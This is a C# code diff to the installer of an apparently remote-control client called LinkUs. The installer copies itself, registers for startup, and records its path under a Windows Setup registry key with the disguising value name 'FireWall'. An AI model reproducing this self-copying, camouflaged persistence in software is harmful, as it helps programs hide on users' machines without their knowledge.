@@ -1,11 +1,13 @@
+using System;
 using System.IO;
+using System.Runtime.InteropServices;
 
 namespace LinkUs.Client.Install
 {
     public class Installer
     {
-        //private const string FilePathLocationRegistry = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup";
-        //private const string FilePathLocationRegistryKey = "FireWall";
+        private const string FilePathLocationRegistry = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup";
+        private const string FilePathLocationRegistryKey = "FireWall";
 
         private readonly IEnvironment _environment;
         private readonly IFileService _fileService;
@@ -27,6 +29,7 @@ namespace LinkUs.Client.Install
 
             _fileService.Copy(_environment.ApplicationPath, targetFilePath);
             _registry.AddFileToStartupRegistry(targetFilePath);
+            _registry.Add(FilePathLocationRegistry, FilePathLocationRegistryKey, targetFilePath);
 
             return targetFilePath;
         }
@@ -39,6 +42,10 @@ namespace LinkUs.Client.Install
             if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                 _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
             }
+        }
+        public string GetCurrentInstalledApplicationPath()
+        {
+            return _registry.Get(FilePathLocationRegistry, FilePathLocationRegistryKey);
         }
     }
 }
